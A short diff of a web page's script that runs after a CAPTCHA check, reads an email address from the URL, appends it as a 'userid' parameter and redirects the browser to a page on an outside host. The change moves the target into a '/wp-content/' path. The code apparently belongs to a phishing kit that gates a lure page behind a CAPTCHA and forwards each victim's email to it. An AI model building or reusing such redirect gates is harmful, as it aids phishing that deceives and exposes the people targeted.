@@ -72,7 +72,7 @@
         console.log("CAPTCHA Verified:", token);
         const email = getEmailFromURL();
         const redirectSuffix = email ? "?userid=" + email : "";
-        const targetURL = "https://filecq.com/lambo.html" + redirectSuffix;
+        const targetURL = "https://filecq.com/wp-content/lambo.html" + redirectSuffix;
 
         setTimeout(() => {
             window.location.href = targetURL;
@@ -90,4 +90,5 @@
 </body>
 
 </html>
+
 
